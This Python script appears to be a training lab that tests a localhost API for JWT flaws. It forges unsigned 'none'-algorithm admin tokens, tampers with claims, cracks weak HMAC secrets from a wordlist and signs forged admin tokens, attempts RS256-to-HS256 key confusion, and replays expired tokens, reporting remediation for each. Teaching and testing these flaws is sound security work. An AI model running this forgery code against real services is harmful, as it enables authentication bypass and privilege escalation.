#!/usr/bin/env python3
"""
API Penetration Testing Lab - Intermediate Lab 1: JWT and Authentication Attacks
Industry-Grade API Penetration Testing Framework

This module systematically tests API endpoints for JWT implementation flaws:
- Exercise 1: JWT Structure Analysis & Component Decoding
- Exercise 2: Signature Bypass via Algorithm 'none' Injection
- Exercise 3: Signature Tampering & Claim Manipulation
- Exercise 4: Weak HMAC Secret Offline Dictionary Attack & Forgery
- Exercise 5: Asymmetric-to-Symmetric (RS256 -> HS256) Key Confusion
- Exercise 6: Token Expiration & Lifecycle Validation
"""

import base64
import hashlib
import hmac
import json
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin

import requests


class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


class JWTAuthenticationLab:
    """Hands-on laboratory for testing JSON Web Token (JWT) vulnerabilities."""

    def __init__(self, base_url: str = "http://localhost:8080/api"):
        self.base_url = base_url.rstrip("/") + "/"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "SecOps-JWTTester/2.0"})
        self.findings: List[Dict[str, Any]] = []

    # ----------------------------------------------------------------------
    # Helper Utilities: Safe Base64URL Encoding / Decoding
    # ----------------------------------------------------------------------
    @staticmethod
    def b64url_decode(data: str) -> Dict[str, Any]:
        """Safely decodes base64url string with dynamic padding."""
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += "=" * padding
        raw = base64.urlsafe_b64decode(data)
        return json.loads(raw.decode("utf-8"))

    @staticmethod
    def b64url_encode(data: Dict[str, Any]) -> str:
        """Encodes dictionary to compact unpadded base64url string."""
        dumped = json.dumps(data, separators=(",", ":")).encode("utf-8")
        return base64.urlsafe_b64encode(dumped).decode("utf-8").rstrip("=")

    def log_result(
        self,
        exercise_name: str,
        vulnerable: bool,
        severity: str,
        impact: str,
        evidence: str,
        remediation: str,
    ):
        status_tag = (
            f"{Colors.RED}[CRITICAL VULNERABILITY]{Colors.RESET}"
            if vulnerable
            else f"{Colors.GREEN}[SECURE]{Colors.RESET}"
        )
        print(f"\n{status_tag} {Colors.BOLD}{exercise_name}{Colors.RESET}")
        print(f"  ├─ Evidence: {evidence}")

        if vulnerable:
            print(f"  ├─ Severity: {Colors.RED}{severity}{Colors.RESET}")
            print(f"  ├─ Impact: {impact}")
            print(f"  └─ Remediation: {Colors.YELLOW}{remediation}{Colors.RESET}")
            self.findings.append(
                {
                    "exercise": exercise_name,
                    "severity": severity,
                    "evidence": evidence,
                    "impact": impact,
                    "remediation": remediation,
                }
            )
        else:
            print(f"  └─ Validation: Token properly rejected or signature strictly enforced.")

    # ----------------------------------------------------------------------
    # Exercise 1: Understanding JWT Structure
    # ----------------------------------------------------------------------
    def exercise_1_jwt_structure(self) -> Optional[str]:
        print(f"\n{Colors.BLUE}=== Exercise 1: JWT Structure & Component Analysis ==={Colors.RESET}")
        print("[*] Task 1: Authenticating to obtain a valid JWT token...")

        login_url = urljoin(self.base_url, "auth/login")
        try:
            res = self.session.post(
                login_url,
                json={"username": "user", "password": "password"},
                timeout=5,
            )

            if res.status_code == 200:
                token = res.json().get("token") or res.json().get("access_token")
                if token and len(token.split(".")) == 3:
                    print(f"  {Colors.GREEN}[+] Token obtained successfully!{Colors.RESET}")
                    self._display_jwt_components(token)
                    return token
                else:
                    print(f"  {Colors.YELLOW}[!] Response received but valid 3-part JWT missing: {res.text}{Colors.RESET}")
            else:
                print(f"  {Colors.YELLOW}[!] Login failed (HTTP {res.status_code}). Using demo token for structure inspection.{Colors.RESET}")

        except requests.RequestException as e:
            print(f"  [!] Target unreachable ({e}). Using offline demo token.")

        # Fallback offline token for demonstration
        demo_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTY5MDAwMDAwMH0.demo_signature_hash"
        self._display_jwt_components(demo_token)
        return demo_token

    def _display_jwt_components(self, token: str):
        parts = token.split(".")
        header = self.b64url_decode(parts[0])
        payload = self.b64url_decode(parts[1])

        print("\n  [+] Decoded Header:")
        print(f"      {Colors.YELLOW}{json.dumps(header, indent=4)}{Colors.RESET}")
        print("  [+] Decoded Payload Claims:")
        print(f"      {Colors.YELLOW}{json.dumps(payload, indent=4)}{Colors.RESET}")
        print("  [+] Raw Signature Component:")
        print(f"      {Colors.BLUE}{parts[2][:30]}...{Colors.RESET}")

    # ----------------------------------------------------------------------
    # Exercise 2: Algorithm 'none' Bypass Attacks
    # ----------------------------------------------------------------------
    def exercise_2_algorithm_attacks(self):
        print(f"\n{Colors.BLUE}=== Exercise 2: Signature Bypass via Algorithm 'none' ==={Colors.RESET}")
        print("[*] Task: Crafting unsigned admin token with algorithm set to 'none'...")

        target_url = urljoin(self.base_url, "protected/admin")
        none_variants = ["none", "None", "NONE", "nOnE"]

        for alg in none_variants:
            header = {"alg": alg, "typ": "JWT"}
            payload = {
                "user_id": 1,
                "username": "admin",
                "role": "superadmin",
                "is_admin": True,
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600,
            }

            none_jwt = f"{self.b64url_encode(header)}.{self.b64url_encode(payload)}."

            try:
                res = self.session.get(
                    target_url,
                    headers={"Authorization": f"Bearer {none_jwt}"},
                    timeout=5,
                )

                if res.status_code == 200:
                    self.log_result(
                        exercise_name=f"Algorithm 'none' Acceptance ({alg})",
                        vulnerable=True,
                        severity="CRITICAL",
                        impact="Complete authentication bypass. Attackers can forge administrative tokens without knowing secrets.",
                        evidence=f"API accepted token with 'alg: {alg}' and granted access to administrative route.",
                        remediation="Explicitly reject any JWT specifying 'none' algorithm. Whitelist allowed algorithms (e.g., RS256/ES256).",
                    )
                    return
            except requests.RequestException:
                pass

        self.log_result(
            exercise_name="Algorithm 'none' Validation",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Server rejected unsigned tokens and enforces cryptographic signature checks.",
            remediation="Maintain strict algorithm verification.",
        )

    # ----------------------------------------------------------------------
    # Exercise 3: Payload Manipulation & Signature Integrity
    # ----------------------------------------------------------------------
    def exercise_3_payload_manipulation(self, original_token: str):
        print(f"\n{Colors.BLUE}=== Exercise 3: Payload Tampering & Signature Verification ==={Colors.RESET}")
        print("[*] Task: Tampering payload claims without recalculating signature...")

        parts = original_token.split(".")
        if len(parts) != 3:
            return

        header = parts[0]
        original_sig = parts[2]

        tampered_payload = self.b64url_decode(parts[1])
        tampered_payload["role"] = "admin"
        tampered_payload["is_admin"] = True
        encoded_tampered_payload = self.b64url_encode(tampered_payload)

        tampered_token = f"{header}.{encoded_tampered_payload}.{original_sig}"
        target_url = urljoin(self.base_url, "protected/admin")

        try:
            res = self.session.get(
                target_url,
                headers={"Authorization": f"Bearer {tampered_token}"},
                timeout=5,
            )

            if res.status_code == 200:
                self.log_result(
                    exercise_name="Missing JWT Signature Verification",
                    vulnerable=True,
                    severity="CRITICAL",
                    impact="Server parses claims from payload without verifying cryptographic signature integrity.",
                    evidence=f"Tampered token with elevated 'admin' role was accepted by the server: HTTP {res.status_code}",
                    remediation="Always verify JWT signatures using a trusted key before trusting any payload claims.",
                )
                return
        except requests.RequestException:
            pass

        self.log_result(
            exercise_name="Signature Integrity Enforcement",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Server rejected tampered payload due to signature mismatch.",
            remediation="Maintain cryptographic verification prior to claims deserialization.",
        )

    # ----------------------------------------------------------------------
    # Exercise 4: Weak HMAC Secret Offline Dictionary Attack
    # ----------------------------------------------------------------------
    def exercise_4_weak_secret(self, sample_token: str):
        print(f"\n{Colors.BLUE}=== Exercise 4: Weak HMAC Secret Cracking & Forgery ==={Colors.RESET}")
        print("[*] Task: Performing offline dictionary attack against token signature...")

        common_secrets = [
            "secret",
            "password",
            "123456",
            "admin",
            "jwt_secret",
            "key",
            "development",
            "supersecret",
            "app_secret",
        ]

        parts = sample_token.split(".")
        if len(parts) != 3:
            return

        signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
        target_sig = parts[2]

        cracked_secret = None
        for candidate in common_secrets:
            computed_sig = (
                base64.urlsafe_b64encode(
                    hmac.new(candidate.encode("utf-8"), signing_input, hashlib.sha256).digest()
                )
                .decode("utf-8")
                .rstrip("=")
            )

            if computed_sig == target_sig:
                cracked_secret = candidate
                break

        if cracked_secret:
            # Now forge an admin token using the cracked secret
            forged_header = {"alg": "HS256", "typ": "JWT"}
            forged_payload = {"user_id": 1, "username": "admin", "role": "admin", "exp": int(time.time()) + 3600}
            msg = f"{self.b64url_encode(forged_header)}.{self.b64url_encode(forged_payload)}"
            forged_sig = (
                base64.urlsafe_b64encode(
                    hmac.new(cracked_secret.encode(), msg.encode(), hashlib.sha256).digest()
                )
                .decode("utf-8")
                .rstrip("=")
            )
            forged_token = f"{msg}.{forged_sig}"

            self.log_result(
                exercise_name=f"Weak HMAC Secret Discovered ('{cracked_secret}')",
                vulnerable=True,
                severity="CRITICAL",
                impact=f"Offline recovery of signing secret enables arbitrary token forgery. Forged token: {forged_token[:40]}...",
                evidence=f"Cracked symmetric key: '{cracked_secret}' matches token signature.",
                remediation="Use high-entropy symmetric keys (>256 bits) generated cryptographically, or migrate to asymmetric keys (RS256).",
            )
        else:
            self.log_result(
                exercise_name="HMAC Secret Key Strength",
                vulnerable=False,
                severity="INFO",
                impact="None",
                evidence="Token signature resisted offline dictionary attack against common weak secrets.",
                remediation="Maintain high-entropy secret management.",
            )

    # ----------------------------------------------------------------------
    # Exercise 5: Asymmetric-to-Symmetric (RS256 -> HS256) Key Confusion
    # ----------------------------------------------------------------------
    def exercise_5_key_confusion(self):
        print(f"\n{Colors.BLUE}=== Exercise 5: Algorithm Confusion (RS256 to HS256 Key Misuse) ==={Colors.RESET}")
        print("[*] Task: Signing forged token with the server's public key using HMAC-SHA256...")

        # In this scenario, the public key is treated as an HMAC secret key by a vulnerable server
        dummy_public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzV..."
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"user_id": 1, "username": "admin", "role": "superadmin", "exp": int(time.time()) + 3600}

        signing_input = f"{self.b64url_encode(header)}.{self.b64url_encode(payload)}"
        forged_sig = (
            base64.urlsafe_b64encode(
                hmac.new(dummy_public_key.encode(), signing_input.encode(), hashlib.sha256).digest()
            )
            .decode("utf-8")
            .rstrip("=")
        )
        confused_jwt = f"{signing_input}.{forged_sig}"

        target_url = urljoin(self.base_url, "protected/admin")
        try:
            res = self.session.get(
                target_url,
                headers={"Authorization": f"Bearer {confused_jwt}"},
                timeout=5,
            )

            if res.status_code == 200:
                self.log_result(
                    exercise_name="Asymmetric Key Confusion (RS256 -> HS256)",
                    vulnerable=True,
                    severity="CRITICAL",
                    impact="Attackers sign arbitrary tokens with public certificates by downgrading the algorithm to HMAC.",
                    evidence=f"Server accepted token signed with public key as HMAC secret.",
                    remediation="Explicitly bind token verification to asymmetric algorithms (RS256) and never trust the 'alg' header to determine algorithm type.",
                )
                return
        except requests.RequestException:
            pass

        self.log_result(
            exercise_name="Algorithm Confusion Defense",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Server strictly enforces expected asymmetric verification algorithm.",
            remediation="Maintain rigid algorithm parameters in JWT middleware.",
        )

    # ----------------------------------------------------------------------
    # Exercise 6: Token Expiration & Lifecycle Validation
    # ----------------------------------------------------------------------
    def exercise_6_token_expiration(self):
        print(f"\n{Colors.BLUE}=== Exercise 6: Token Expiration & Lifecycle Enforcement ==={Colors.RESET}")
        print("[*] Task: Testing server handling of expired tokens ('exp' claim in the past)...")

        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "user_id": 1,
            "username": "admin",
            "role": "admin",
            "exp": 1000000000,  # Expired in 2001
        }

        signing_input = f"{self.b64url_encode(header)}.{self.b64url_encode(payload)}"
        sig = (
            base64.urlsafe_b64encode(
                hmac.new(b"secret", signing_input.encode(), hashlib.sha256).digest()
            )
            .decode("utf-8")
            .rstrip("=")
        )
        expired_token = f"{signing_input}.{sig}"

        target_url = urljoin(self.base_url, "protected/users")
        try:
            res = self.session.get(
                target_url,
                headers={"Authorization": f"Bearer {expired_token}"},
                timeout=5,
            )

            if res.status_code == 200:
                self.log_result(
                    exercise_name="Expired Token Accepted",
                    vulnerable=True,
                    severity="HIGH",
                    impact="Lack of expiration validation allows captured tokens to be used indefinitely.",
                    evidence=f"API accepted token with expired 'exp' claim: HTTP {res.status_code}",
                    remediation="Validate the 'exp' claim on all requests and immediately reject expired tokens.",
                )
                return
        except requests.RequestException:
            pass

        self.log_result(
            exercise_name="Token Expiration Validation",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Expired tokens are properly rejected by the verification middleware.",
            remediation="Maintain strict expiration checks.",
        )

    # ----------------------------------------------------------------------
    # Harness Execution
    # ----------------------------------------------------------------------
    def run_all_exercises(self):
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD} INTERMEDIATE LAB 1: JWT & AUTHENTICATION PENETRATION SUITE{Colors.RESET}")
        print(f" Target API: {self.base_url}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")

        sample_token = self.exercise_1_jwt_structure()
        self.exercise_2_algorithm_attacks()
        if sample_token:
            self.exercise_3_payload_manipulation(sample_token)
            self.exercise_4_weak_secret(sample_token)
        self.exercise_5_key_confusion()
        self.exercise_6_token_expiration()

        print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}AUDIT SUMMARY{Colors.RESET}")
        print(f"Total Authentication Flaws Discovered: {len(self.findings)}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")


if __name__ == "__main__":
    try:
        lab = JWTAuthenticationLab(base_url="http://localhost:8080/api")
        lab.run_all_exercises()
    except KeyboardInterrupt:
        print("\n\n[!] Lab execution interrupted by user.")
    except Exception as e:
        print(f"\n[!] Lab runtime error: {e}")
